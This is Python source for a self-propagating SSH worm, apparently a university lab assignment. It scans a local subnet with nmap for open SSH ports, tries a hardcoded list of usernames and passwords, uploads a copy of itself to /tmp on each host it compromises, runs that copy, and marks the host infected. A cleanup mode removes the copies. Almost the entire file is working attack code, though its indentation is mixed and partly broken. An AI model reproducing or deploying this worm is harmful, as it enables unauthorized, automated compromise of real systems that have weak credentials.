import paramiko
import sys
import socket
import nmap
import netinfo
import os

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():

    return os.path.exists(INFECTED_MARKER_FILE)
        
#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
    print("Mark file infected")
    worm = open(INFECTED_MARKER_FILE, "w")
    worm.write("Your system has been infected")
    worm.close()

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
        sftpClient = sshClient.open_sftp()
	
   	sftpClient.put("/tmp/worm.py", "/tmp/" + "worm.py")

	sshClient.exec_command("chmod a+x /tmp/worm.py")	

   	sshClient.exec_command("python /tmp/worm.py ")
 

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
        print("Try to connect to " + host +  " using " +  userName + " and " +  password)
    	try:
             sshClient.connect(host, username = userName, password = password)
             print("Opened a connectin to the victim's system!")
	     print("Credentials " + userName + " and " + password + " worked.")
	     return 0             
        except paramiko.SSHException:
             print("Wrong credentials! Try again.")
             return 1
        except socket.error:
             print("Server is down or has some other problem.")
             return 3

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	global credList
	
	ssh = paramiko.SSHClient()

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	attemptResults = None
				
	for (username, password) in credList:
		
		if (0 == tryCredentials(host, username,password,ssh)):
                    	value = tryCredentials(host, username, password, ssh)
			print("Successfully compromised the system!")
			return ssh
	
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	return netinfo.get_ip(interface)

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	portScanner = nmap.PortScanner()
	
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
	
	hostInfo = portScanner.all_hosts()	
	
	liveHosts = []
	
	for host in hostInfo:
		
		if portScanner[host].state() == "up":
			liveHosts.append(host)
		
	return liveHosts

#######################################################
# Clean by removing the marker and copied worm program
# @param sshClient - the instance of the SSH client 
# connected to the victim system
#######################################################
def cleaner(sshClient): 
	
	sshClient.open_sftp()
	
	sshClient.exec_command("rm /tmp/worm.py /tmp/infected.txt")

	sshClient.close()

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
	
	if (isInfectedSystem()):
		print("System is already infected")
		sys.exit()
	else:
		markInfected()

elif (len(sys.argv) == 2):

	if (sys.argv[1] == '-c'):
		print("Initializing cleaning command")

		networkHosts = getHostsOnTheSameNetwork()

		myIP = getMyIP("enp0s3")

		networkHosts.remove(myIP)

		print "Cleaning hosts: ", networkHosts

		for host in networkHosts:
	
			sshInfo =  attackSystem(host)
			
			if sshInfo:
				print("Cleaning worm from infested host:")
				print(sshInfo)
				cleaner(sshInfo)

	
	elif(sys.argv[1] == '-e'):
		myIP = getMyIP("enp0s3")

		print("Initializing infection command")

		print("Attacker's current system IP " + myIP)

		print(" Hosts on the same network")

		networkHosts = getHostsOnTheSameNetwork()

		networkHosts.remove(myIP)

		print "Found hosts: ", networkHosts

		for host in networkHosts:
			sshInfo =  attackSystem(host)
	
			print sshInfo
				
			if sshInfo:
				print "Trying to spread"
	
				try:
					sftp = sshInfo.open_sftp()
        				remotepath = '/tmp/infected.txt'
		        		localpath = '/home/cpsc/'
					sftp.get(remotepath, localpath)
					print("This system is already infected!")
				except IOError:
		       			print "This system should be infected"
					spreadAndExecute(sshInfo)
					print "Spreading complete"	
	else:
		print("Invalid command is either -e or -c")
		sys.exit()
elif (len(sys.argv) > 2):
	print("Invalid command")

